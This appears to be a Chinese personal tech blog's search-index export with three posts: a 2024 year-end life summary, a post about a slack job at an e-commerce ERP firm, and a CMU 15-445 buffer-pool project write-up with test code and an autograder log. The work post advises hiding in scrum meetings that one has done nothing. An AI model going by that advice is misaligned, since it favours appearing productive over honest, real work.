而且薪资也不太满意\u0026hellip;毕竟专业不对口也没办法。 于是急中生智的我就说我要回一趟老家，得下个月入职。\n后来还面了虾皮，面试官挺好的，一直在耐心听我讲项目，对我的项目也很感兴趣，还给他远程演示了一下。 后来聊着聊着就越来越深入，印象比较深的是问了我无栈协程的实现原理、数据库索引等，这些都是我的知识盲区。 最后的笔试题我记得是用递推实现二叉树前序遍历，当时有点紧张没想出来，只做过递归版本的。 唉，只能说上天给了我一次进入大厂的机会，但是我没能把握住。\n思考了一周后，感觉目前自己也没更好的选择，想着能进 B 端公司学习一下复杂业务场景也不错。 于是还是决定入职了那家 C# 的小公司。 另外还有个主要原因是物质需求，母亲没法支撑我生活支出，我只能尽快自己搞钱。\n月底和母亲回了一趟湖南老家，庆祝外公 80 大寿。\n九月份\n入职新公司，学习 C#。\n新公司 30 多人，干的是跨境电商 ERP 云平台。\n16 号在莲花山公园玩。\n23 号笔记本黑屏拿去维修，因为之前进水问题，现在需要更换主板，付了 2000 维修费。\n26 号跟随公司参与亚马逊云科技消费科技峰会。\n月底炉石传说国服回归，充了回归礼包。后来 11 月份上了一次传说，不过上分环境没有外服好。\n十月份\n国庆节假期。 2 号回了一趟惠州博罗老家，扫墓。\n十一月份\n3 号和女朋友去了石鼓山公园玩。\n7 号去吃了麦当劳回归的咔嗞脆鸡腿堡 😍\n17 号去猫咖玩。\n23 号吃了达美乐火山披萨。\n24 号和女朋友去爬塘朗山，爬了一个下午到天黑，累到腿软，晚上吃了生日蛋糕。\n十二月份\n不知道是不是因为冬天到了，三线仓鼠去世了。 难以想象它昨天还在跑滚轮。 本来寻思广东天气应该不至于冷，现在后悔没有做好保暖措施。\n14 号公司组织去爬银湖山，很快就到达了终点鸡公头，体力还不错。\n玩了玩之前 steam 秋促买的游戏。 文明 6 非常好玩，沉迷中。 妹相随 dlc 也上线了，很棒。\nProject dapp-chat，去中心化聊天 Dapp，go + vue3 全栈。 脑龄预测，学校课设，从 MRI 脑成像预测年龄，torch + vue3 全栈。 食物识别，大创项目，识别食物并计算氛围灯光，torch (unet) + vue3 全栈。 ComfyUI-OOTDiffusion，蹭热度的 ComfyUI 节点（其实随手写的只用了两个钟），400+ star ⭐。 NoneBot 多适配器兼容，简单依赖注入兼容 NoneBot 多适配器。 医疗报告生成，毕设项目，引用的是 这个模型，我的工作主要是原理解析和训练结果分析。 GenerationDataViewer， C# WPF 小项目，用于查看 SD 或 ComfyUI 的生成信息。 NoneBot NSFW 识别器，群聊色图识别器，附带保存功能（不是）。 iloveapi-python，给 iLoveIMG 写的 Python SDK。 Shopping 今年购物比较少，没什么特别需要买的。打算过年换台手机。\n购入了 3DS 和 Switch OLED。\n塞尔达王国之泪、宝可梦朱紫。\nCook 我个人非常注重健康，于是毕业租房后，料理便成为了日常。\n图片我就不想在这贴了，平时偶尔会发推特上。\n掌握了一些技术含量较高的菜：爆炒包菜、炒牛肉、辣椒炒肉、茄子肉沫等。还有很多家常菜。\n还有咖喱、汉堡比较容易弄，同时也很好吃，偶尔会弄一下。\n掌握了一些汤和配料的技巧：胡萝卜玉米排骨汤、苦瓜排骨汤。\nAnime 平时用 notion 管理进度，不是很喜欢 bangumi。\n今年绝大多数番剧都是和女朋友一起看的，大约看了 40 多部。 平均下来每个季度会看 10 多部番。 并不是每部都看完了，有少部分是只看了 1-3 话就弃了的。\n我就不全部贴出来了，随便贴一点：\n反派千金等級 99 ～我是隱藏頭目但不是魔王～ 我独自升级 肌肉魔法使 2 转生为第七王子，随心所欲的魔法学习之路 迷宫饭 夜晚的水母不会游泳 转生贵族凭鉴定技能扭转人生 终末的火车前往何方 怪兽 8 号 怪异与少女与神隐 Girls Band Cry 我要【招架】一切～反誤解的世界最強想成為冒險家～ 杖与剑的魔剑谭 新人大叔冒险者，被最强队伍操到死成无敌 最狂輔助職業【話術士】世界最強戰團聽我號令 魔王 2099 魔法光源股份有限公司 此外，还和女朋友一起把全职猎人追完了，海贼王也看到了 130 话（虽然我是二观）。\nMovie 今年学会了在淘宝买电影票，省了一笔钱。\n在电影院看的有：\n潜行 你想活出怎样的人生 间谍过家家 代号：白 寂静之地：入侵日 焚城 蓦然回首 毒液：最后一舞 线上看的有：\n哈尔的移动城堡（女朋友没看过陪她看） 怪物 请和我的老公结婚 杀人者的难堪 虽然只是弄丢了手机 2023 姥姥的外孙 鱿鱼游戏 2（这个算今年看的） Game Arcaea 没怎么玩了，pjsk、muse dash 偶尔玩玩，平时主要是被女朋友拉着去打舞萌 DX 比较多。\n今年去日本接触了很多音游，最喜欢的是音击 🥰 大概玩掉了几万日元，还拿到了活动 CD\n还有 maimai 日版的歌曲也很多很棒，喜欢玩 pjsk 的歌和术力口。\n在 3ds 上玩了《塞尔达：众神的三角力量》玩了一半。\n在 switch 上玩了《塞尔达：王国之泪》玩了四分之一。\n炉石传说国服回归了，玩了会上个传说，然后就没怎么玩了，上下班通勤玩玩挺不错的。\n下面是 steam 相关游戏\nA way out，双人成行前身，和女朋友玩目前进度 1/3。 星露谷，和女朋友一起种田，已经可以打到沙漠洞穴 100 层了。 Days gone，不好玩，已退款。 致命公司，应该是今年玩的最久的联机游戏了，非常棒，和朋友玩的很开心，凑不够四个人也可以去公开房玩，大家非常友好（戏骨多）。 认识了很多好玩的人，也尝试自己上好玩的 mod 开房，常常 12 个人满房，氛围还是很棒的。 逃离后室，和朋友玩了一半，后面卡在了派对客很难受，没玩了。 饿殍：明末千里行，剧情很棒，憨八嘎的配音也很喜欢，后来新出的钉宫的配音也不错。 妹相随，和妹妹冒险的故事，非常棒，dlc 已买。 夏日狂想曲，乡村爱情故事，还不错。 贝果爱情故事，炒饭新游戏，还不错。 杀戮尖塔，休闲卡牌游戏，不错。 東津萌米，大米的养成游戏，非常可爱。 文明 6，打通了君主难度科技胜利和征服胜利，硬核游戏。 Rabi-Ribi，萌耳兔兔 RPG 游戏，好玩。 还玩了 epic 免费送的游戏，幽灵线东京、消逝的光芒，不过都没玩多久。\n此外，购入了但是还没开始玩的游戏：恋爱绮谭、毛绒天使疗愈人生、深海迷航冰点之下。 还有一些零零散散的小众游戏我就不讲了。\nShare 推荐几篇今年看过的好文章：\n记录裁员后的半年前端求职经历 前端可观测性 奇特的大陆银行卡外刷小 Tips React or Vue UI 设计原则 Design tips 现代打工人如何获得幸福？ C# 构建 2KB 游戏 程序员的四种类型 美团 DDD 运用 正则运作原理 前端构建工具进化历程 字节前端监控 五十岁咸鱼翻身转码上岸 你不需要 nextjs TCP 挥手、中断与异常 从零开始理解 React Hooks 逆向 PJSK 扭蛋 Thinking 在第一家公司实习做 C 端出海产品，对当时的我来说，肯定不是一个错误的选择。 我很庆幸自己可以接触到一个主流产品该有的模样和对出海 C 端技术栈的运用。 即便我离开了这家公司，我也不会忘记在这个地方的工作体验是很不错的。\n目前这家公司则让我感受到，进入企业之后，才能明白自己想要的是什么，而社会需要的是什么。 不再自以为是，也会发现技术浪漫主义是不现实的。\n我也深刻理解到，拿自己的尺子去度量别人是件愚蠢的事情，指望得到别人的认可更是一件天真的事情。\n回顾大学这几年，做了特别多的项目，数学建模、CTF、帮大学老师做一个试题库网站、OSPP、给 CPython 等开源库贡献、发表图像融合论文、p2p 信安赛项目。 感觉自己突飞猛进，但实际上是一步一脚印过来的，也可能有一部分高中编程知识的厚积薄发。\n希望自己能牢记，热爱为主，赚钱为辅。 我从事计算机，只是因为我的兴趣爱好正好是计算机，平时喜欢读新鲜的技术文章，学习各种编程语言，也喜欢玩 CTF。 但是社会上绝大多数的人都并非如此，拿自己对技术的理想主义去审判别人是不可取的。 我只需要做好分内的事情，保持对生活的热爱就行了。\n今年经常被女朋友拉出去玩，爬山、吃大餐、打舞萌 DX 等。 两个人在一起，会感觉世界的范围变大了很多。 总之就是非常开心~\n最后是我在「总之就是非常可爱」中看到的，或许可以多多少少代表我的心情：\n","date":"2025-01-13T16:05:45+08:00","image":"https://s2.loli.net/2025/01/13/o9P45qzeiVmNI82.jpg","permalink":"https://blog.tinyume.com/2025/2024-summary/","title":"2024 年终总结"},{"content":"文章的描述来自于 Grifters, believers, grinders, and coasters 这篇文章，里面很好地阐述了公司里的不同人群以及相处的方法，推荐阅读。\nGrifters, believers, grinders, and coasters 简单解释一下公司中的 4 种角色：\nGrifter：骗子，擅长伪装形象获得公司领导层的重视，擅长充当项目负责人\nBeliver：信仰者，重视公司的使命和客户的需求，擅长充当产品和品质保证\nCoaster：杯垫，完成分内的工作，避免不必要的工作\nGrinder：研磨机，埋头解决问题，可以迅速完成工作\n以我的经历而言，在不同公司可能会承担不同的角色。\n例如，在上一家 AI 创业公司里，我突然成为了核心角色，必须成为 Grinder 才能迅速地完成 MVP 和工作交付。 而在目前这家公司，我是边缘角色，在刚开始工作的时候我是 Grinder，只顾着埋头写代码，不重视工作成果和上级反馈。 但是在经历了几次否定过后，我学着成为了一个 Coaster，只完成分内的工作。 同时意识到了我的项目负责人是个 Grifter —— 他不会写代码、经常偷懒睡觉、职位是测试，但他依旧成为了领导重视的核心人物。\n我是如何做好一个 Coaster 的呢？其实不难。\n稍微关注一下工作成果反馈，在我们公司则是 pingcode 工作项。 将自己边缘化，每天完成一个小目标即可，我的情况下就是每天写 100 行代码，其实用不到 2 个钟。 不要尝试一次性完成大量工作，你的工作进度永远需要和项目负责人协调。 没有工作时，一定记得督促你的项目负责人。 注意在 scrum 会议上不要让别人知道你什么都没干，如果直接和领导开 scrum 会议，记得多讲讲自己怎么和其他成员协作，怎么解决问题。 永远记住，拿自己的尺子去度量别人是件愚蠢的事情，指望得到别人的认可更是一件天真的事情。 所幸我的项目负责人是 Grifter，对我也比较关心。 在我成为一个 Coaster 后，每天只需要写不到两个钟的代码，其余时间都可以干自己的事情。 例如之前写的 CMU 15-445 和博文，还可以拥有大量时间阅读 Follow，可以让我专注个人的提升。\n成为一个 Coaster 就意味着你的目标不再是得到领导的认可，或者在公司承担核心架构工作之类的。 这些工作轮不到你，我有个资深级别同事干了一年每天也只是做业务。 以我的感受来说，能够得到一个较重要的业务模块开发工作，就是你在这家公司的目标了。 没有也没关系，平时注重个人提升，再跳槽下一家即可。\n工作 关于目前在干的这家公司，我的职位是 C# 后端开发。 其实之前从来没接触过 C#，只有 C++ / Go 是我唯二掌握的静态语言。 入职动机也比较单纯吧，就是听说 C# 写起来挺舒服的想试试。\n编程语言 说到「舒服」，我就很想吐槽 py 和 js 总有很多方言。\npy 值得吐槽的是，类型标注一坨、from __future__ import annotations 需要运行时 eval、ForwardRef 混乱等问题，还有 asyncio 的任务取消在复杂场景下很难绷，经常需要写出这种方言：\n1 2 3 4 5 6 7 try: await asyncio.wait_for(task, 5) except (asyncio.TimeoutError, asyncio.CancelledError): # asyncio.CancelledError caused by parent cancelling task.cancel() with contextlib.suppress(asyncio.CancelledError): await task 3.11 还新增了一个 uncancel()，是真的难绷。\njs 值得吐槽的首先就是 Object.keys / hasOwnProperty 这些方言，就不像个现代语言。 还有就是 Array.sort 省略参数的话，排序数字默认会把数字转字符串，按照 ASCII 排序，这点挺反直觉的，这个在 MDN 有记载。\n上面讲的都是 js 语言上的问题，此外还有 ejs / mjs 导出兼容和依赖兼容，double import 的问题（这个我目前没遇到）。 还有就是 js 没有上下文的概念，只有全局变量，像 vue 提供的上下文都是在 compile 阶段完成的，比如 setup 之前会设置 currentInstance，所以要是在异步函数里面引用这些上下文函数会引发意料之外的问题。\n相比之下，C# 的历史遗留问题还是挺少的。 好用的特性也蛮多的，比如 Linq、导航属性、拓展方法、delegate 等，异步设计也挺优秀的。 不过也有一些问题，比如数组协变导致性能差，多泛型 interface 和重载实现会出现混淆，这里就不细讲了。\n感想 这边就不过多废话了，继续聊聊（吐槽）工作吧。\n其实 12 月份和朋友聊了一下，我才大约知道了自己做的是个什么性质的工作。\n简单来说就类似工厂 IT。 主要股东是一家卖家具的公司，我们公司主要就是做他们跨境电商的云平台支持。 具体业务模块就包括物流、供应商、采购、财务、报表等，对接亚马逊平台。\n我对目前这家公司印象算不好不坏吧。 印象差的原因既不是加班，也不是被 PUA，而是每天工作太闲了\u0026hellip;\n在公司里有摆烂人，也经常出现状态不同频的情况。 摆烂人就是每天装忙，其实与我无关倒还好。 但是我的项目负责人是个摆烂人，这在刚开始的时候令我很痛苦。 某一次不知道需要推进什么工作的时候，被责骂的是我，反而不是项目负责人，挺逆天的。\n每天大家都不知道是装忙还是真忙，经常能看到别人在看短视频。 下班点到了也不走，非要多待半个钟，不过没有加班倒还好。 不过我每天都是那个准点下班的勇士，已经习惯了。 日报也是重复废话一大堆，没有周报月报什么的倒还好，日报也没人看。\n云平台的负责人呢，会议里一句话能概括的事情，他可以讲成一篇文章，主打废话文学。 还有虽然他没有在飞书明着说，但是经常能听到他在工位大声讲，问他也不知道怎么解决，他也不知道是哪个小组的 bug 不知道归谁管，问他的话他还要再同频到对应小组，他说效率低，纯纯的甩手掌柜。\n我的工作就是一边学习一边干着 python 的 ui 自动化测试基建。 最开始我还会想他们招我过来不会就是为了写 python 吧，不过他们真的不重视这个项目，可有可无。 这个工作倒是挺简单的，就是 selenium 网页自动化 xpath / css selector 封装和 POM 架构开发。 不过 ui 测试本身就挺傻逼的 —— “测了一半，如测”。即使页面点击了，流程也通了，但是不知道结果对不对，断言还要拉取网络响应包，或者从页面上想办法断言。\n我曾多次提出给 python 开发加上格式化器和代码检查器。负责人也只是嘴上说着接受意见，但是一直摆烂。 你摆烂就算了，还非要拉一些工作去支撑自己的工作内容，你连 python 基础都没打好。 结果就是，本来我一个人写的好好的模块，硬给我改成一片红，经常会有逻辑错误、传参错误，还有一堆 repeat code。 python 代码格式不规范就算了，缩进甚至还不一致，我看着你的代码，简直像是浑身上下有蚂蚁在爬。\n这就是所谓的 重视架构 的企业。 我一直觉得架构是为良好的技术基础服务的，连个代码都写不明白的人，整天在空谈架构，就很魔幻。 整天讲 SOLID，讲 DRY，结果一看代码惨不忍睹。\n看一眼就会毙命：\n1 2 if items[0][\u0026#34;title\u0026#34;][0].css(\u0026#34;.more-operation \u0026gt; button\u0026#34;): items[0][\u0026#34;title\u0026#34;][0].css(\u0026#34;.more-operation \u0026gt; button\u0026#34;).click() 我还经常在群里看到很多问题，比如他们后端很多微服务的参数无校验、foreach async 逆天写法等。 前端更是一坨，图片没剪裁压缩，一个 index.css 有 500 多 KB，一大堆直接引用没有 code splitting 的 js 资源，lighthouse 性能跑分 58，LCP 4s，而且还是内网服务器。\n使用这个平台能遇到一万个 bug，严重阻碍自己开发。\n特别地，我使用 cloc 分析了一下后端代码库，其中 C# codegen 127w 行，C# 73w 行。 看似很多，但实际上很多是 infra，其中业务层代码大约有 28w 行。 看似也很多，但 DDD 设计中有很多接口设计，比如 ICommand / ICommandHandler / IRepository 之类的，还有微服务的 RPC 调用。 另外我甚至还看见一大堆重复 IService 定义，不清楚这具体有什么意义可能是我目光短浅了。\n减去这些代码，其实估计也就 10w 行左右，我实在不认为这是多大的代码量，以至于可以产出这么多的 bug。\n这一切也不怪他们，只能怪我自己太菜了，没能进入到更厉害的公司。\n至于我闲到什么程度呢？就是 3 个月试用期过去了不管不问，也没什么进度和规划，我当时忍不了了便督促他们尽快给我渡过学习期。 但是换来的却是对我的冷嘲热讽，即便从 commit 历史记录上争不过，但还是非要挑点刺出来，比如说我每天准时到点就走人，说我和同事关系不好，说我遇到上司也不问好。 我只想说，你不会真以为你们代码库是什么金子吧 😅\n在那之后我就觉得寻求别人的认可是个很天真的事情。 后来我就转变成了一个 \u0026ldquo;Coaster\u0026rdquo;，你们爱咋地咋地吧。\n不过我也学到了很多，例如掌握了新的编程语言 C#，语法糖多，linq 写起来也很爽。 架构和软件设计原则更熟练了，以前都没有特别在意这些。 比如说我之前用过依赖注入，甚至实现过，但是掌握了依赖倒置原则后，我可以明白这么设计的优点具体在哪里。 其实大多数场景的架构模式都成熟了，没有必要从头设计。 平时写代码还是那样子写，没什么太大的变化。\n还有就是学习到了 Domain-Driven Design (DDD) 这个比较新颖的设计模式，对这个的印象还是不错的。\n开了一个 C# 大项目的坑，是很久之前就想写的一个动漫客户端，调研过很久，想要集成 wiki / bangumi / mal 之类的。\n后记 总的来说呢，这份工作还算不错。 每天的工作量非常小，基本上 2 小时之内就可以搞定，公司资金也看似「稳定」。 虽然我并不是想摆烂，只是不想把时间浪费在各种库/工具/业务的学习上，目前我的主要目标是掌握数据库和分布式，但是轻松的工作还是令我感觉很舒适。 此外，绩效占比低，所以我都不在意绩效评优。 团队也没有内卷，挺友善的（除了大家聚一起吐槽公司之外 🤣）\n至于跳槽，应该暂时没那么快，想先做点业务模块再说吧。 后端比较卷，跳槽还不一定能涨到多高的薪，这是一个需要经验的职位。 深入学学 react 和 v8 再跳槽到前端的话也挺不错。 主要还是想尝试一下进入大厂，最好还能是比较好的项目组。\n我已经 23 岁了，技术其实也就干那么几年，就算进入大厂也赚不了多少钱，也就图个好奇和满足愿望。\n海外不是经常会讲 Work Life Banlance (WLB) 嘛。 最近在 这篇文章 里看到了一个新的角度：「你并不需要 Work Life Balance，生活是一切，工作只是工作。」 我觉得也挺有道理的，工作只是赚钱的一个手段，而诗和远方只存在于日常生活之中。 不过在深圳的生活还是不错的，目前我的通勤 40 多分钟，8 点半起床，晚上 7 点半可以到家，也能租到便宜还不错的房子。\n","date":"2025-01-13T16:05:44+08:00","permalink":"https://blog.tinyume.com/2025/my-work/","title":"我的工作"},{"content":"Project #1 Buffer Pool Manager 本文记录一下我完成 CMU-15-445 Project #1 的历程，讲讲 what \u0026amp; why，包含了我的思考历程，但不会包含任何具体的实现方法。\n本文出现的所有单词中，heap file 代表数据库文件，储存数个无序的数据库页； page 代表数据库页；frame 代表内存中的数据库页； bpm 代表 buffer pool manager；\n下面进入正文 ——\nbuffer pool manager，即数据库缓冲池，它提供两个功能：\n数据库磁盘 I/O 交互，缓存失效时才进行磁盘读写 CRUD 数据库页，即 CRUD frame bpm 包含 3 个组件：\nreplacer 页面置换器 disk scheduler 磁盘请求队列 buffer pool manager 缓冲池管理器 本课程的目标就是实现这 3 个组件，完成一个 thread-safe buffer pool manager。\nTask #1 LRU-K Replacement Policy 实现一个基于 LRU-K 算法的 replacer。\n与 LRU 类似，LRU-K 也是用于淘汰掉最不常用的元素（cold data）。\nLRU-K 计算时会遍历所有元素，查找其访问的历史记录，不足 k 次则可以直接淘汰。 否则找出所有元素的 前 k 次访问 与 当前时间步 的差值最大值。\n注意，这里使用的概念是 时间步 (timestep) 而非讲义里面所说的 时间戳 (timestamp) 。\n讲义的原句是 Backward k-distance is computed as the difference in time between the current timestamp and the timestamp of kth previous access.。 我一开始就误以为 timestamp 是现实世界的时间戳，我想，毫秒级的精度肯定不够吧，于是调查了一番 c++ 时间戳。 感到不对劲但是又没有其他提示后，便去翻了之前课程的实现，才发现是一个计数\u0026hellip;踩了个坑。\n具体来说，时间步是一个计数概念，从 0 开始，每个访问元素便 +1 即可。\n此外，bpm 还有 evictable（可淘汰）的概念，当 frame 设置为 evictable 时，replacer 才能淘汰它。\nTask #2 Disk Scheduler 一个磁盘请求调度器。挺简单，10 分钟可以搞定。\nDiskScheduler 调用 DiskManager 管理物理磁盘。\nDiskManager 中，page id 从 0 开始，长度为 4096，比如 0-4096 比特范围为 page 0 的内容。 为了减少系统调用，文件会初始化 16 个 page 大小的空间，在需要扩充的时候 x2 。 IncreaseDiskSpace 虽然命名上看是增加，但实际上是传入总的 page 数量，然后它内部再判断是否需要扩容。 以及 DiskManager 内部储存了 page 数量，但是实际上没有作用。 还有 DeletePage 方法也没有实现（虽然也没这个必要），DiskManagerMemory 用了但是用途不一样。这两点稍微有点设计问题和误导性。\n底层的 disk manager 磁盘操作已经预先写好了，需要实现的 disk scheduler 就是管理一个 worker 线程，将读写 page 的请求放入队列，返回 promise。\n这里就不得不提一下 c++ 的 promise / future 协程模型了。\npromise: set_value / set_exception / get_future 用于存放任务的值 future: get / wait / wait_for 用于等待任务和获取结果 但是呢，python 的协程模型中，future 用于存放任务的值，task 才是用于管理任务的。 javascript 和 c# 也类似。\n包括上面的，c++ 这些奇怪的协程接口设计 😅，比如 promise.get_future() 、std::move(promise) 等操作让我写起来感觉非常难受。\nTask #3 Buffer Pool Manager 完成了 LRU-K 替换策略和磁盘调度器后，就可以着手开始解决最复杂的部分 —— Buffer Pool Manager 的实现。\n首先，我觉得最重要的是搞懂这一套流程是怎么工作的、为什么要这么设计。\n这些细节内容是讲义里面没有的，基本上都需要靠自己摸索、碰壁，最终才能理解并实现。 之前做 CS144 也是类似的感觉，细节的东西都需要靠自己做。 相比之下，CMU 15-445 提供了基本数据类型定义，至少你知道这个字段是有用的，我没有用到的话那可能是我实现错了。\n在做开源软件的时候，我们经常能看到 Tech Specification，一份好的设计文档可以受益整个群体，并且能够跟踪项目的细节变更，比如 Python PEPs 或者 RLPx。\n但是在现实工作中，我们很难见到这样的案例，原因是编写和维护起来非常困难。你说业务发展快，那么就算假设有慢速的业务，会有人去为公司（无论什么行业）写 Spec 吗？我想答案是没有，包括我自己。 原因是没有意义，不能给你带来绩效，甚至没有认可。 你走了之后的人受益了，那又与你何关。\n我曾经为此深恶痛绝，如果你做 infrastructure 相关的工作（想想看你做的工具要被公司很多小组用到），那就更为如此。 这都是公司管理层的偏好问题，你没法控制。\n但至少我们自己要做有意义的事情，将来某天要组建自己的团队时，我们可以用到这些经验。\nPage Guard 核心理念\n思考一下面向接口编程，用户接口首先是越简洁越好，符合单一职责，不希望让用户使用锁，更不希望用户知道 buffer pool manager 里面的 frame 机制。\n为了实现这个，当用户申请读写某个页面时，buffer pool manager 返回一个 page guard 对象，这个对象可以理解为 python 里面的上下文管理器、c# 里面的 IDisposable。 page guard 的具体实现使用了 C++ 的 RAII 机制，利用对象生存周期来管理资源，这是 C++ 中普遍的最佳实践。 利用 RAII，page guard 创建时可以自动上锁，析构时可以自动释放锁，防止对 frame 的读写产生数据竞争或者脏读。\n这个 frame 锁存在哪里其实不重要，但是在这个项目里面 frame 算是单例对象，所以锁就存在 frame 上即可，写入时独占锁，读取时共享锁。\nframe 的读写锁，具体来说，创建一个 write page guard 时，在堆栈变量的上下文内持有一个独占锁，防止其他线程读取或写入； 创建一个 read page guard 时，在堆栈变量的上下文内持有一个共享锁，允许多个线程读取，但不允许拥有独占锁。 这个 rwlock 在 c++ 里面就是 std::shared_mutex，具体用的什么公平策略在这里也不重要。\n再次总结和理解一下 PageGuard 的 RAII 机制和锁：\nWritePageGuard 持有时，则无法拥有任何其他 WritePageGuard 和 ReadPageGuard 对象。跨线程锁住此对象，析构时释放锁 没有 WritePageGuard 持有时，可以拥有多份 ReadPageGuard。有 ReadPageGuard 存在时，则无法创建 WritePageGuard 管理 frame pin count，构造时 +1，析构时 -1，为 0 时设置 frame evictable 特别要注意的是，C++ 的 RAII 还包含了移动语义，和复制语义类似。 移动语义首先会为类实例分配一个未定义的内存空间，然后通过右值引用传入的参数和 std::move 来构造该对象，所以需要注意不要引发 UB 和 double free (double move)。 善用项目里面给的 is_valid 来处理 RAII 语义。\n原文对 pin count 的解释是 The pin count of a frame is the number of threads that have access to the page's data.，这个解释应该是有点毛病的，正确来说是 guard 持有数，因为同一个线程是允许持有两份相同 ReadPageGuard 的。\n我写了个测试，你可以试试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 TEST(BufferPoolManagerTest, MyCustomTest) { auto disk_manager = std::make_shared\u0026lt;DiskManager\u0026gt;(db_fname); auto bpm = std::make_shared\u0026lt;BufferPoolManager\u0026gt;(FRAMES, disk_manager.get(), K_DIST); auto pid0 = bpm-\u0026gt;NewPage(); { auto guard0 = bpm-\u0026gt;WritePage(pid0); char str[] = \u0026#34;Hello world!\u0026#34;; char *data = guard0.GetDataMut(); snprintf(data, sizeof(str), \u0026#34;%s\u0026#34;, str); auto pin = bpm-\u0026gt;GetPinCount(pid0); ASSERT_EQ(1, pin); } { auto guard1 = bpm-\u0026gt;ReadPage(pid0); auto guard2 = bpm-\u0026gt;ReadPage(pid0); auto pin = bpm-\u0026gt;GetPinCount(pid0); // This explains that pin count is not just // `The pin count of a frame is the number of threads that have access to the page\u0026#39;s data.` // said in project #1 instruction. ASSERT_EQ(2, pin); } } Buffer Pool Manager 实现\n我的实现顺序：\n先完成不带锁的 replacer，因为没有测试担心后面出错 完成 disk scheduler 理解 bpm 的 page guard，完成不带锁版本并通过测试 完善代码并通过 bpm 的 basic test，到这里就完成了大部分了，后面都是锁和 debug 添加 page guard 和 replacer 锁，可以完成本地的所有测试 添加 bpm 锁，完成 gradescope 所有测试 死锁\n对于死锁，讲义里面给了提示 holding the buffer pool latch from beginning to end should be enough (except for when you need to release it early to prevent deadlocks)\n但是我依旧思考了很久，最终在阅读了 DeadlockTest 这个测试用例后，才恍然大悟。\n死锁的情况是这样的：当主线程持有了 page0 的互斥锁后，子线程尝试获取 page0 的互斥锁时会等待。 如果子线程里 bpm 的锁未释放，主线程再调用一次 bpm 的带锁函数，就会卡死。\n理解了问题所在之后，就很好解决了，这里就不具体讲了。\n其他并发问题\n在为已缓存的 frame 建立 page guard 之前，注意首先将 frame 设为 non-evictable，否则 page guard 等待锁的时候，其他线程可能会 evict frame atomic 如果自增并且需要获取旧值，一定记得用 fetch_add(1) 或者 i++ gradescope 的测试用例并非完美，如果代码中有细微的差错，就会出现一些偶发性问题，比如：\nBufferPoolManagerTest.ConcurrentWriterTest (0/5)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026gt; GTEST_COLOR=yes ctest . -R ^BufferPoolManagerTest.ConcurrentWriterTest$ --no-tests=error --verbose UpdateCTestConfiguration from :/autograder/source/bustub/build/DartConfiguration.tcl UpdateCTestConfiguration from :/autograder/source/bustub/build/DartConfiguration.tcl Test project /autograder/source/bustub/build Constructing a list of tests Done constructing a list of tests Updating test list for fixtures Added 0 tests to meet fixture requirements Checking test dependency graph... Checking test dependency graph end test 18 Start 18: BufferPoolManagerTest.ConcurrentWriterTest 18: Test command: /autograder/source/bustub/build/test/grading_buffer_pool_manager_test \u0026#34;--gtest_filter=BufferPoolManagerTest.ConcurrentWriterTest\u0026#34; \u0026#34;--gtest_also_run_disabled_tests\u0026#34; \u0026#34;--gtest_output=xml:/autograder/source/bustub/build/test/grading_buffer_pool_manager_test.xml\u0026#34; \u0026#34;--gtest_catch_exceptions=0\u0026#34; 18: Test timeout computed to be: 120 18: Running main() from gmock_main.cc 18: Note: Google Test filter = BufferPoolManagerTest.ConcurrentWriterTest 18: [==========] Running 1 test from 1 test suite. 18: [----------] Global test environment set-up. 18: [----------] 1 test from BufferPoolManagerTest 18: [ RUN ] BufferPoolManagerTest.ConcurrentWriterTest 18: /autograder/source/bustub/test/buffer/grading_buffer_pool_manager_test.cpp:991: Failure 18: Expected equality of these values: 18: 0 18: bpm-\u0026gt;GetPinCount(page_ids[i]) 18: Which is: (1) 18: 18: [ FAILED ] BufferPoolManagerTest.ConcurrentWriterTest (1184 ms) 18: [----------] 1 test from BufferPoolManagerTest (1184 ms total) 18: 18: [----------] Global test environment tear-down 18: [==========] 1 test from 1 test suite ran. (1184 ms total) 18: [ PASSED ] 0 tests. 18: [ FAILED ] 1 test, listed below: 18: [ FAILED ] BufferPoolManagerTest.ConcurrentWriterTest 18: 18: 1 FAILED TEST 1/1 Test #18: BufferPoolManagerTest.ConcurrentWriterTest ...***Failed 1.22 sec 0% tests passed, 1 tests failed out of 1 Total Test time (real) = 1.23 sec The following tests FAILED: 18 - BufferPoolManagerTest.ConcurrentWriterTest (Failed) Errors while running CTest Output from these tests are in: /autograder/source/bustub/build/Testing/Temporary/LastTest.log Use \u0026#34;--rerun-failed --output-on-failure\u0026#34; to re-run the failed cases verbosely. Program exited with 8 in 1.238s 最后，提交的时候遇到了 clang-format 的错误。\n它原本的代码在我使用 clang-format-18 格式化之后就变了，应该是版本的差异导致的。 直接在上下文使用 // clang-format off 和 // clang-format on 搞定。\n提交 没做优化。\n可优化的地方很多，比如 disk manager 就可以实现为并发的多线程版本，这个应该还算容易实现。 以后可能有空写写。\nLeaderboard QPS Benchmark: 3917.82663\n排名算中游，一共评分的也就 70 多个，外校的学生还是比较少，不过官方的 discord 群挺活跃的。\n后记 零零散散花了一个月时间，我终于写完了！ 公司的工作虽然枯燥，但胜在事少，可以让我有足够的时间完成这个项目。\n总体来说，Project #1 完成的还算顺利。\n从最初看 bpm 时一头雾水，到迷茫但是决定先写 page guard，到通过了 page guard 测试，到逐步完成 bpm，最终掌握它的实现原理。\n在无数次提交中，终于有一次提交达到满分，还是挺高兴的。\nProject #2 还会更难，但是我并没有觉得任何的痛苦和退缩。\n做这门课的意义是什么？我突然想到这个问题。似乎从 csdiy.wiki 上看到这门课之后，我就直接开始做了，并没有什么特殊的理由。 单纯的数据库理论知识直接背八股文就行了，但是我不喜欢，做这门课至少能让我觉得有意思。\n其他 将博客头像旧的 jsdelivr 资源转移到了 sm.ms 图床上，另外还发现 sm.ms 的直链变为了 s2.loli.net。\n将主头像源转移到了 Gravatar 代理镜像。 原本考虑使用 gravatar.loli.net 镜像，但是 size 参数无效，就放弃了。 现在用的是 weavatar 速度很棒。\n发现 iyume.live 域名可以注册，$24.10 似乎也还能接受。\n想写个自己的 Astro 博客，现在这个主题用起来问题还是挺多的。 刚发现的问题是没有按需载入、也没法关掉 photoswipe 功能。 关心起性能后，才发现好多问题\u0026hellip;😣 希望以后有空可以改进。\n最近想要多写点博文，看看能不能把日本旅行和 2024 年终总结写一写。\n","date":"2025-01-11T18:21:48+08:00","permalink":"https://blog.tinyume.com/2025/cmu15445-p1/","title":"CMU 15-445 Project 